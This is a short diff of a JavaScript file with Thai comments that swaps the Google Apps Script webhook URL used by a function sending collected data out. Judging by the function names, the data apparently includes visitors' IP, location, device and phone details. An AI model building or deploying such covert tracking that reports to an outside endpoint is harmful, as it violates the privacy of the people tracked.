@@ -863,7 +863,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwRWNIG8NP1ckMGkRrsbIQb_LBzhbkjMGNp3pkKQoDGZdVlAiKXtPIGM6whZSaQPHqvSw/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzHJWwjlntch8ygzLMY1T3efRE2KuaD881NaPGpNsnV6Nq8FosWDokUmF-yw37hF665/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
